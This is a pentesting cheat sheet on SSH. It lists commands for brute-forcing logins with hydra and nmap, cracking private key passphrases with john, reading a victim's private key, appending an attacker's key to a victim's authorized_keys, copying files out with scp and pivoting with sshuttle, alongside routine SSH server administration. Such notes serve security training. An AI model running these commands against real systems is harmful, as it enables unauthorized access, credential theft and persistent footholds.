---
title: Secure Shell (SSH) Pentesting
desc: Default port is 22.
tags: [22, Netcat, Nmap, PrivEsc, Privilege, SSH]
alts: []
render_with_liquid: false
---

## Enumeration

1. **Use Nmap**

    ```sh
    nmap --script ssh-brute -p 22 <target-ip>
    nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 <target-ip>
    nmap --script ssh-* -p 22 <target-ip>
    ```

2. **Brute Force Credentials**

    ```sh
    # -t: tasks
    hydra -l username -P passwords.txt <target-ip> ssh -t 4
    hydra -L usernames.txt -p password <target-ip> ssh -t 4

    # Specific ports
    hydra -l username -P passwords.txt -s 2222 <target-ip> ssh -t 4
    hydra -l username -P passwords.txt ssh://<target-ip>:2222 -t 4
    ```

    If the target host opens port 80 or 443, you can generate wordlist from the contents of the website then use Hydra.

    ```sh
    cewl http://<target-ip> > wordlist.txt
    ```

3. **Crack SSH Private Key**

    First of all, you need to format the private key to make John to recognize it.

    ```sh
    ssh2john private_key.txt > hash.txt
    # or
    python2 /usr/share/john/ssh2john.py private_key.txt > hash.txt
    ```

    Crack the password of the private key using the formatted text.

    ```sh
    john --wordlist=wordlist.txt hash.txt
    ```

<br />

## Investigation

1. **Useful Tools**

- **[ssh-audit](https://github.com/jtesta/ssh-audit){:target="_blank"}{:rel="noopener"}**

    SSH server and client auditing.

    ```sh
    ssh-audit <target-ip>
    ```

2. **Banner Grabbing**

    ```sh
    nc <target-ip> 22
    ```

<br />

## Connect

1. **Connect using Credential**

    If you know target credential, you can connect remote SSH using it.

    ```sh
    ssh username@<target-ip>
    ssh username@<target-ip> -p 22

    # Without username
    ssh 10.0.0.1
    ```

    If you got the error message "...no matching host key type found. Their offer: ssh-rsa",

    ```sh
    ssh -o HostKeyAlgorithms=+ssh-rsa username@10.0.0.1
    ```

    - **Execute Commands after Connecting**

        ```sh
        ssh username@<target-ip> 'ls -l'
        ```

    - **Test Connection**

        ```sh
        ssh -T username@10.0.0.1
        ssh -T username@10.0.0.1 -vvv
        ```

    - **Connect to Windows via Active Directory**

        ```sh
        ssh domain-name\\username@domain-controller
        ```

2. **Connect using the Existing Private Key**

    1. **Copy the Content of id_rsa (Private Key)**

        In remote machine,

        ```sh
        cat /home/<victim-user>/.ssh/id_rsa
        ```

    2. **Create New Private Key in Local Machine**

        ```sh
        echo 'copied content of id_rsa' > private_key.txt
        ```

        Don't forget to change permission this file. Otherwise, you cannot connect remote server.

        ```sh
        chmod 600 private_key.txt
        ```

    3. **Connect using Private Key**

        ```sh
        ssh -i private_key.txt victim-user@<remote-ip>
        ```

<br />

## Transfer File From Remote to Local

1. **Use SCP**

    **SCP (Secure Copy)** relies on SSH. So you need to use SSH's username/password.

    - **In Target Machine**

        ```sh
        scp ./example.txt local-user@<you-local-ip>:./example.txt
        ```

    - **In Your Local Machine**

        ```sh
        scp target-user@<target-ip>:./example.txt .
        ```

<br />

## Create SSH Keys

Use **ssh-keygen**.

1. **Generate Keys**

    ```sh
    ssh-keygen

    # Specify the output file
    ssh-keygen -f key
    # Specify Ed25519
    ssy-keygen -t ed25519
    ```

2. **Install SSH Key**

    In target machine,

    ```sh
    ssh-copy-id username@10.0.0.1
    ```

<br />

## Generate SSH Keys and Set Up Public Key to Connect Remote Machine

1. **Check if authorized_key Exists in Remote Machine**

    ```sh
    ls /home/<remote-user>/.ssh/authorized_key
    ```

    If it exists, you may be able to connect SSH with your keys as victim user.

2. **Generate SSH Keys**

    ```sh
    ssh-keygen -f key

    # Copy the content of publick key
    cat ./key.pub
    ```

    Then copy the content of public key you generated.

3. **Add the Content of Publick Key to authorized_keys**

    In remote machine,

    ```sh
    echo '<content of id_rsa.pub' >> /home/<victim-user>/.ssh/authorized_keys
    ```

<br />

## SSH Server

- **Start/Stop/Restart**

    - **Start**

        ```sh
        sudo /etc/init.d/ssh start
        # or
        sudo systemctl start ssh
        ```

    - **Stop**

        ```sh
        sudo /etc/init.d/ssh stop
        # or
        sudo systemctl stop ssh
        ```

    - **Restart**

        ```sh
        sudo /etc/init.d/ssh restart
        # or
        sudo systemctl restart ssh
        ```

- **Status**

    ```sh
    sudo /etc/init.d/ssh status
    # or
    sudo systemctl status ssh

    ps -e | grep ssh
    ```

- **Configuration**

    ```sh
    vim /etc/ssh/sshd_config
    ```

- **Check for any Established Connection**

    To get the “pts/# terminal”, run the following command. The pts stands for pseudo terminal slave.

    ```sh
    who | grep <username>
    ```

    To kill any connections, run the following commands.

    ```sh
    # -f: full process name to match
    sudo pkill -f pts/#
    ```

- **Logs**

```sh
# Authentication logs
grep 'sshd' /var/log/auth.log
```

<br />

## SSH Proxy Server

- **Use Sshuttle**

    **[sshuttle](https://github.com/sshuttle/sshuttle){:target="_blank"}{:rel="noopener"}** is transparent proxy server that works as a poor man's VPN. Forwards over ssh.

    ```sh
    sshuttle -r username@<remote-ip> <remote-ip>/24

    # Automatically determine subnet
    sshuttle -r username@<remote-ip> -N

    # Using private key
    sshuttle -r username@<remote-ip> --ssh-cmd "ssh -i private_key" <remote-ip>/24

    # Exclude the specific ip (-x)
    sshuttle -r username@<remote-ip> <remote-ip>/24 -x <remote-ip>
    ```

    Then you can access to other networks.

    - **Troubleshooting**

        If you get the error "Failed to flush caches: Unit dbus-org.freedesktop.resolve1.service not found...", you need to flush DNS cache.


        ```sh
        sudo systemctl enable systemd-resolved.service
        sudo resolvectl flush-caches
        ```

        Run sshuttle again.